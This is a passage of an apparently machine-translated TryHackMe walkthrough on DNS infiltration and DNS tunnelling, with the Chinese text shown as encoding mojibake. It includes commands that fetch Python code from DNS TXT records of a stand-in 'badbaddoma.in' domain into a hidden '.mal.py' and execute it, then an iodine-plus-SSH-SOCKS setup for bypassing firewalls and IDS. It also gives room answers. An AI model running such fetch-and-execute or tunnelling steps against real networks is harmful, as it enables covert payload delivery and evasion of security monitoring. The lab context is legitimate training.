æŒ‰ç…§ä»»åŠ¡æ–‡ä»¶ä¸­çš„è¯´æ˜å®Œæˆè¯¥é—®é¢˜ã€‚

**é—®é¢˜ 1:** è¾“å…¥æ‰§è¡Œçš„ python æ–‡ä»¶çš„è¾“å‡º

```
nslookup -type=txt badbaddoma.in | grep ig | cut -d \" -f2 > .mal.py
cat .mal.py
nslookup -type=txt code.badbaddoma.in
```

![](img/4fcccb73b2ee368571649e005507c930.png)

```
nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \" -f2 > .mal.py
python3 ~/dns-exfil-infil/packetySimple.py
cat .mal.py
python3 .mal.py
```

![](img/712cd1afae4f7e888d74c74404fb46f9.png)

> **ç­”æ¡ˆ:4 . 4 . 0â€“186-é€šç”¨**

# ä»»åŠ¡ 11: DNS éš§é“

åœ¨å‰ä¸¤ä¸ªä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å·²ç»çœ‹åˆ°äº†å¦‚ä½•ä½¿ç”¨ DNS è¯·æ±‚å’Œå“åº”æ¥æ¸—é€å’Œæ‰§è¡Œæœ‰æ•ˆè´Ÿè½½ã€‚å…¬å¸é€šå¸¸ä¼šå®‰è£…é˜²ç«å¢™ã€IDSs(å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ)å’Œ/æˆ– IPSs(å…¥ä¾µä¿æŠ¤ç³»ç»Ÿ),ä»¥ä¾¿åœ¨ä¸éœ€è¦çš„å…¥ç«™å’Œå‡ºç«™åè®®é€šè¿‡å…¶ç½‘ç»œæ—¶è¿›è¡Œé¢„é˜²/æŠ¥è­¦ã€‚å…¬å¸å¾ˆå°‘ç›‘æ§çš„ä¸€ä¸ªåè®®æ˜¯ DNSã€‚æ­£å› ä¸ºå¦‚æ­¤ï¼Œé»‘å®¢èƒ½å¤Ÿé€šè¿‡ä½¿ç”¨ DNS éš§é“ç»•è¿‡è®¸å¤šâ€œä¸æƒ³è¦çš„â€åè®®ã€‚

# æ¼”ç¤º

åœ¨è¿™ä¸ªæ¼”ç¤ºä¸­ï¼Œæˆ‘ä»¬å°†æ¢ç´¢é»‘å®¢å¦‚ä½•é€šè¿‡ä½¿ç”¨ HTTP over DNS ç»•è¿‡å„ç§å—é™ç½‘ç«™ã€‚ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œæˆ‘å°†ä½¿ç”¨â€œç¢˜â€ã€‚ä½ å¯ä»¥åœ¨è¿™é‡Œé˜…è¯»æ›´å¤šå…³äºâ€˜ç¢˜â€™çš„å†…å®¹:[ç¢˜](https://code.kryo.se/iodine/)ã€‚

![](img/bc0adc472f55b2007c0c2ad51a5763ad.png)

æˆ‘çš„è®¾ç½®å¦‚ä¸‹:

*   æˆ‘æœ‰ä¸€å° AWS æ‰˜ç®¡çš„ Linux æœºå™¨ï¼Œå®ƒå°†æˆä¸º DNS éš§é“æœåŠ¡å™¨ã€‚
*   åœ¨æˆ‘çš„æœ¬åœ°è®¡ç®—æœºä¸Šè¿è¡Œçš„ Ubuntu VM å°†æˆä¸º DNS éš§é“å®¢æˆ·ç«¯ã€‚
*   è°·æ­ŒåŸŸå( [badbadtunnel.in](http://badbadtunnel.in/) )ä¸Šæ‰˜ç®¡çš„å…¬å…±åŸŸå

è¿™æ˜¯ DNS é…ç½®çš„æ ·å­:

![](img/f4d9e0a92c87e9a507462aa94e43bb13.png)

è¦å¼€å§‹ï¼Œä¸¤å°æœºå™¨éƒ½éœ€è¦å®‰è£…ç¢˜é…’ã€‚å¦‚æœä½ ä½¿ç”¨çš„æ˜¯åŸºäº Debian çš„å‘è¡Œç‰ˆï¼Œæ¯”å¦‚ Kaliï¼Œå®ƒä¼šåœ¨ä»–ä»¬çš„ apt ä»“åº“é‡Œã€‚

`sudo apt install iodine`

**ç¢˜** â€”å®¢æˆ·

**ç¢˜åŒ–** â€”æœåŠ¡å™¨

åœ¨ AWS æœåŠ¡å™¨ä¸Šï¼Œæˆ‘ä»¬ä½¿ç”¨ä»¥ä¸‹å‚æ•°å¯åŠ¨ iodined:

![](img/8344b0f4e2e021001ea70b8c5b13c175.png)

**ç«¯å£** â€” 27001

**DNS éš§é“æœåŠ¡å™¨çš„ IP**â€”10 . 0 . 0 . 1

**å­åŸŸå** â€” tunnel.badbadtunnel.in

ç°åœ¨ï¼Œåœ¨æˆ‘ä»¬çš„å®¢æˆ·æœºä¸Šï¼Œæˆ‘ä»¬ç”¨è¿™äº›å‚æ•°è¿è¡Œç¢˜:

![](img/a5dcb5b2c8596c6ce26e9c1c3f947438.png)

**DNS éš§é“æœåŠ¡å™¨çš„ IP**

**å­åŸŸå**

å¦‚æœä¸€åˆ‡éƒ½è®¾ç½®æ­£ç¡®ï¼Œæˆ‘ä»¬ç°åœ¨åº”è¯¥å·²ç»è¿æ¥åˆ°æˆ‘ä»¬çš„ DNS éš§é“æœåŠ¡å™¨ã€‚æˆ‘ä»¬å¯ä»¥è¯•ç€ ping 10.0.0.1 (DNS éš§é“æœåŠ¡å™¨)çœ‹çœ‹æ˜¯å¦è¿æ¥ä¸Šäº†ã€‚

![](img/26f8ae7ef6b5f05eb28c1029b9d6dd1b.png)

**æˆåŠŸäº†ï¼**

ç°åœ¨æˆ‘ä»¬å·²ç»å®Œæˆäº†ä¸€åŠã€‚æˆ‘ä»¬çš„ HTTP over DNS è¿˜æ²¡æœ‰å®Œå…¨è®¾ç½®å¥½ã€‚

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦ç”Ÿæˆä¸€ä¸ª SSH å¯†é’¥ï¼Œå¹¶å°† **id_rsa.pub** çš„å†…å®¹ä¸Šä¼ åˆ°æˆ‘ä»¬çš„ DNS éš§é“æœåŠ¡å™¨çš„ **authorized_keys** æ–‡ä»¶ä¸­ã€‚ä»¥ä¸‹æ˜¯æ­¥éª¤ã€‚

![](img/d76949dcba1a9a3f3cc08eb979556cec.png)

è¿™æ˜¯ **id_rsa.pub** çš„å†…å®¹

![](img/f3620d77c43b9b16fe5c3d94e3010e4a.png)

è¿™é‡Œä½ å¯ä»¥çœ‹åˆ°æˆ‘åœ¨æˆ‘çš„ DNS æœåŠ¡å™¨ä¸ŠæŠŠ **id_rsa.pub** å†…å®¹æ·»åŠ åˆ°äº† **authorized_keys** ä¸­ã€‚è¿™å°†å…è®¸æˆ‘ SSH åˆ°æˆ‘çš„æœåŠ¡å™¨ã€‚

![](img/fa12f4627523c6675834b78bf11a39d0.png)

ç°åœ¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é€‰é¡¹-D 8080 SSH åˆ°æˆ‘ä»¬çš„ DNS éš§é“æœåŠ¡å™¨

![](img/c4a30d90eee78cc27e498c59e08564b9.png)

å·®ä¸å¤šäº†ï¼Œç°åœ¨æˆ‘ä»¬åªéœ€è¦æ‰“å¼€æµè§ˆå™¨(æœ¬ä¾‹ä¸­æ˜¯ Firefox)å¹¶æ›´æ”¹ä»£ç†è®¾ç½®ã€‚è¿˜æœ‰æµè§ˆå™¨æ‰©å±•ï¼Œæ¯”å¦‚ FoxyProxy æˆ–è€… Proxy SwitchyOmegaã€‚

å¯¹äºä»£ç†é€‰é¡¹ï¼Œæˆ‘ä»¬éœ€è¦é€‰æ‹©â€œæ‰‹åŠ¨ä»£ç†é…ç½®â€ã€‚

å°† SOCKS ä¸»æœºçš„ IP åœ°å€è®¾ç½®ä¸ºâ€œ127.0.0.1â€ï¼Œç«¯å£å·è®¾ç½®ä¸ºâ€œ8080â€ã€‚

![](img/fce65e45a72c58bae5aa26a397b83287.png)

**æå®šï¼**

æˆ‘ä»¬ç°åœ¨ä½¿ç”¨ HTTP over DNSâ€¦å¦‚æœæˆ‘ä»¬è½¬åˆ° myip.isï¼Œæˆ‘ä»¬åº”è¯¥çœ‹åˆ°æˆ‘ä»¬çš„ DNS éš§é“æœåŠ¡å™¨çš„å…¬å…± ip åœ°å€ã€‚

![](img/0754648c1bce811f5489f84a43f2880b.png)

ä»€ä¹ˆç¨‹åºç”¨äºé€šè¿‡ DNS å»ºç«‹ HTTP éš§é“ï¼Ÿ

> **ç­”æ¡ˆ:*ç¢˜é…’***

ä½ å¯ä»¥åœ¨:
**LinkedIn:-**[https://www.linkedin.com/in/shamsher-khan-651a35162/](https://www.linkedin.com/in/shamsher-khan-651a35162/)
**Twitter:-**[https://twitter.com/shamsherkhannn](https://twitter.com/shamsherkhannn)
**Tryhackme:-**[https://tryhackme.com/p/Shamsher](https://tryhackme.com/p/Shamsher)

![](img/09e5bbba06c7688a702aeec8570d243c.png)

å¦‚éœ€æ›´å¤šæ¼”ç»ƒï¼Œè¯·åœ¨å‡ºå‘å‰ç»§ç»­å…³æ³¨â€¦
â€¦

è®¿é—®æˆ‘çš„å…¶ä»–æ¼”ç»ƒ:-

æ„Ÿè°¢æ‚¨èŠ±æ—¶é—´é˜…è¯»æˆ‘çš„æ¼”ç»ƒã€‚
å¦‚æœæ‚¨è§‰å¾—æœ‰å¸®åŠ©ï¼Œè¯·ç‚¹å‡»ğŸ‘æŒ‰é’®ğŸ‘(é«˜è¾¾ 40 å€)å¹¶åˆ†äº«
ç»™æœ‰ç±»ä¼¼å…´è¶£çš„äººå¸®åŠ©ï¼+éšæ—¶æ¬¢è¿åé¦ˆï¼